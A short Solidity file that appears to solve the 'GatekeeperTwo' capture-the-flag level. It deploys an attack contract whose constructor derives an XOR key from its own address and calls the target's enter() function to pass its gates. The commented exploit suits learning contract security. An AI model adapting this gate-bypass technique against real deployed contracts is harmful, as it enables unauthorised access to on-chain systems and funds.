// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./GatekeeperTwo.sol";

contract GatekeeperAttack{

    constructor(address _addr)public{
        /*
        require 6427117074688828612 ^ something == 18446744073709551615
        In binary: 
        fromSender = 101100100110001101101001110110101010110101011001110010011000100
        fromKey    = bitflip of fromSender which is fromSender ^ 0xFFFFFFFFFFFFFFFF
        ---------------------------------------------------------------------------------- XOR ( The result in each position is 1 if only one of the bits is 1,
                = 1111111111111111111111111111111111111111111111111111111111111111            but will be 0 if both are 0 or both are 1)

        note: if a ^ b = c, then a ^ c = b so we can also use this since it's faster
        */
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        _addr.call(abi.encodeWithSignature("enter(bytes8)", _key));
    }  
}